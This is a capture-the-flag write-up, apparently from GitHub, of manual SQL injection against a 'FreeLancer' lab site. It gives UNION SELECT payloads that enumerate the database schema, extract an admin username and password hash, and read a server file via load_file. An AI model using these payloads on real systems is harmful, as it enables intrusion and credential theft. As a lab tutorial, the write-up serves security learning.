# FreeLancer

## Exploring SQL injection manually (without sqlmap, just browser and URL)

### First step : recognition

at first I looked at the source code of the page:

![image](https://user-images.githubusercontent.com/53917092/94802615-5afafd80-03be-11eb-8df1-d49a7aea2f79.png)


and then these comments caught my attention

![image](https://user-images.githubusercontent.com/53917092/94802741-909fe680-03be-11eb-872e-80ee32c05a06.png)


so I checked these pages

* /portfolio.php?id=1
* /portfolio.php?id=2
* /portfolio.php?id=3

![image](https://user-images.githubusercontent.com/53917092/94802936-e1afda80-03be-11eb-89e7-e4dbd060f0d8.png)

![image](https://user-images.githubusercontent.com/53917092/94802981-f3917d80-03be-11eb-8cbc-ad288a8c7dcb.png)

![image](https://user-images.githubusercontent.com/53917092/94803017-fee4a900-03be-11eb-9b0d-4bd3fc74251a.png)


It is obvious that they are not separate pages, it's a pattern that changes only the number according to the id

so I tried to make a simple sql injection using the command "order by" to find out how many columns this "id" table has

> id= 1 order by 1
![image](https://user-images.githubusercontent.com/53917092/94805682-2c335600-03c3-11eb-9688-d8afd3105a71.png)

> id= 1 order by 2
![image](https://user-images.githubusercontent.com/53917092/94805721-35bcbe00-03c3-11eb-9ed7-449136fdb388.png)

> id= 1 order by 3
![image](https://user-images.githubusercontent.com/53917092/94805751-40775300-03c3-11eb-8f90-a845ca17118a.png)

> id= 1 order by 4 (error? dont exist)
![image](https://user-images.githubusercontent.com/53917092/94805773-49682480-03c3-11eb-88c9-63c3dd2997d2.png)


so we find that there are from tables 1 to 3

to be able to see the information of our sql consults, I will use "union select"

![image](https://user-images.githubusercontent.com/53917092/94806344-2b4ef400-03c4-11eb-8058-9299a62821b8.png)

to ignore the first sentence, I will change 1 for -1

>id=1 union select 1,2,3

=>

> id=-1 union select 1,2,3

![image](https://user-images.githubusercontent.com/53917092/94806452-56d1de80-03c4-11eb-96e6-c5bd26153e32.png)

now, we can view the informations in 2 and 3 from this union select

example :

if i change 

> id=-1 union select 1,2,3 

to

> id = -1 union select 1,"gabriel","vernilo"

i will see this :

![image](https://user-images.githubusercontent.com/53917092/94806641-add7b380-03c4-11eb-8f4c-c99b7f42a3b7.png)

and if i use :
id=-1 union select 1," ",@@version

![image](https://user-images.githubusercontent.com/53917092/94806920-30f90980-03c5-11eb-9239-181b4669f515.png)


we discovered the version of the database


![image](https://memegenerator.net/img/instances/56516390.jpg)


the next parts involves knowledge on how mySQL databases work

mySQL databases have by default a table with several information called information_schema

using this we can get the name of the databases

> id=-1 union select 1," ",schema_name from information_schema.schemata

![image](https://user-images.githubusercontent.com/53917092/94808687-e036e000-03c7-11eb-93a4-2ba2c2cf93df.png)

now we know that there are databases : freelancer; information_schema; mysql; performance_schema

now I'll try to get the names of the tables from inside the "freelancer" database

> id=-1 union select 1," ",table_name from information_schema.tables where table_schema = "freelancer"

![image](https://user-images.githubusercontent.com/53917092/94810199-170df580-03ca-11eb-90dd-97ff91e7e7d9.png)

now I will try to see the columns inside the safeadmin table inside the freelance database

> id=-1 union select 1," ",column_name from information_schema.columns where table_schema = "freelancer" and table_name = "safeadmin"

![image](https://user-images.githubusercontent.com/53917092/94810635-a7e4d100-03ca-11eb-8623-41e7d3d00cdb.png)

now I'll try to see the username column information

> id=-1 union select 1," ",username from safeadmin

now we have that the user is safeadm

![image](https://user-images.githubusercontent.com/53917092/94811175-64d72d80-03cb-11eb-963f-b3f2a5607959.png)

now I'll try to see the password column information

> id=-1 union select 1," ",password from safeadmin

![image](https://user-images.githubusercontent.com/53917092/94811077-47a25f00-03cb-11eb-8b7e-37e71686e050.png)

the admins password isn't ```"$2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K"```

it's a hash, which I can't break :(

looking for ideas I decided to go back to the initial phase, the recognition

so I did a fuzzing to discover more directories and files

for this I used the tool called dirbuster

![image](https://user-images.githubusercontent.com/53917092/94811860-4cb3de00-03cc-11eb-813a-0e4ed55737bd.png)

so I found the file : /administrat/panel.php (admin's panel, probably)

![image](https://user-images.githubusercontent.com/53917092/94813747-c8af2580-03ce-11eb-927a-a8f5e9de232d.png)

in the browser the page redirects to /administrat/index.php and asks for a login

![image](https://user-images.githubusercontent.com/53917092/94814045-2b082600-03cf-11eb-804e-add3c04d25bf.png)


so I tried to read with a SQL command

> id=-1 union select 1," ",load_file("/var/www/html/administrat/panel.php")

and this shows us the flag;

![image](https://user-images.githubusercontent.com/53917092/94814288-833f2800-03cf-11eb-92f8-6a43e34b9b91.png)

